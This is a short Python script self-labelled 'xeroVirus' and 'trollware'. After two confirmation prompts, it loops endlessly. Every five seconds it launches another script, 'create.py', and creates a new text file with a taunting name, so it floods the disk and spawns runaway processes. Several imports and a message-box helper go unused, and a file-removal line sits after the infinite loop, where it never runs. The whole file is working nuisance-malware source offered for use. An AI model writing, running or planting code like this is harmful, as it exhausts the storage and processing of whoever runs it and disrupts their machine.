import os, time
import pyautogui as pya
import webbrowser as wb
import tkinter as tk
import ctypes
# //////////////
##  Styles:
##  0 : OK
##  1 : OK | Cancel
##  2 : Abort | Retry | Ignore
##  3 : Yes | No | Cancel
##  4 : Yes | No
##  5 : Retry | Cancel 
##  6 : Cancel | Try Again | Continue

# ///////////////
def msg(title, text, style):
    return ctypes.windll.user32.MessageBoxW(0, text, title, style)
os.system("title xeroVirus by vzi")
def main():
    n = 1
    while True:
        n+=1
        time.sleep(5)
        os.startfile("create.py")
        f = open(f"xero on top hahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahaha {n}.txt", "x")
        
    os.remove("./test.py")
print("""


██╗░░██╗███████╗██████╗░░█████╗░  ████████╗██████╗░░█████╗░██╗░░░░░██╗░░░░░░██╗░░░░░░░██╗░█████╗░██████╗░███████╗
╚██╗██╔╝██╔════╝██╔══██╗██╔══██╗  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██║░░░░░░██║░░██╗░░██║██╔══██╗██╔══██╗██╔════╝
░╚███╔╝░█████╗░░██████╔╝██║░░██║  ░░░██║░░░██████╔╝██║░░██║██║░░░░░██║░░░░░░╚██╗████╗██╔╝███████║██████╔╝█████╗░░
░██╔██╗░██╔══╝░░██╔══██╗██║░░██║  ░░░██║░░░██╔══██╗██║░░██║██║░░░░░██║░░░░░░░████╔═████║░██╔══██║██╔══██╗██╔══╝░░
██╔╝╚██╗███████╗██║░░██║╚█████╔╝  ░░░██║░░░██║░░██║╚█████╔╝███████╗███████╗░░╚██╔╝░╚██╔╝░██║░░██║██║░░██║███████╗
╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░  ░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚══════╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝
""")
run = input("This is trollware. Run? [y/n] ")
if run == "y":
    run2 = input("THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED TO YOUR COMPUTER. ARE YOU SURE [y/n] ")
    if run2 == "y":
        while True:
            main()
    
